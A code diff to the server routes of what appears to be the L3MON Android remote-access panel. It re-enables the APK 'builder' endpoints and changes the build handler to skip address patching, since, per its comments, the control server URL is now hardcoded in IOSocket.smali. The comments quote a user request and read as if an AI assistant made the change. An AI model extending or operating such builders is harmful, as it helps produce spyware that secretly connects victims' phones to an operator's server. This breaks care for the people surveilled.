@@ -58,34 +58,30 @@ routes.get('/logout', isAllowed, (req, res) => {
 });
 
 
-// routes.get('/builder', isAllowed, (req, res) => {
-//     res.render('l3mon/builder', {
-//         myPort: CONST.control_port
-//     });
-// });
+routes.get('/builder', isAllowed, (req, res) => {
+    res.render('l3mon/builder', {
+        myPort: CONST.control_port
+    });
+});
 
-// routes.post('/builder', isAllowed, (req, res) => {
-//     if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
-//         if (!error) apkBuilder.buildAPK((error) => {
-//             if (!error) {
-//                 logManager.log(CONST.logTypes.success, "Build Succeded!");
-//                 res.json({ error: false });
-//             }
-//             else {
-//                 logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-//                 res.json({ error });
-//             }
-//         });
-//         else {
-//             logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-//             res.json({ error });
-//         }
-//     });
-//     else {
-//         logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-//         res.json({ error });
-//     }
-// });
+routes.post('/builder', isAllowed, (req, res) => {
+    // If no URI/PORT provided, we just build with the defaults (which are now hardcoded in smali or pre-patched)
+    // BUT the original code expects query params to patch.
+    // The user wants to "remove customly add ip and port when build apk".
+    // So we should SKIP the patchAPK step if no params, OR provide dummy params if we want to rely on the hardcoded value.
+    // Actually, since we hardcoded the URL in IOSocket.smali, we can skip the patch step entirely or just run build.
+    
+    apkBuilder.buildAPK((error) => {
+        if (!error) {
+            logManager.log(CONST.logTypes.success, "Build Succeded!");
+            res.json({ error: false });
+        }
+        else {
+            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
+            res.json({ error });
+        }
+    });
+});
 
 
 routes.get('/logs', isAllowed, (req, res) => {
